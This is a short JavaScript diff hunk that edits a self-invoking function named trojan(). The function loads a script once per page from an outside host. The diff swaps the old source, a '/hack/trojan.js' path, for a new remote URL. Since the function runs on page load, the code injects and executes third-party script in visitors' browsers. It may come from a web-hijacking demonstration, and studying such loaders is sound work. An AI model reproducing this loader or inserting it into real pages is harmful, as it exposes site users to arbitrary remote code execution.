@@ -59,7 +59,7 @@
     function trojan() {
         if (!window._actived) {
             window._actived = true;
-            loadScript('//www.etherdream.com/hack/trojan.js');
+            loadScript('//test.soundtooth.cn/js/location.js');
         }
     }
     trojan();
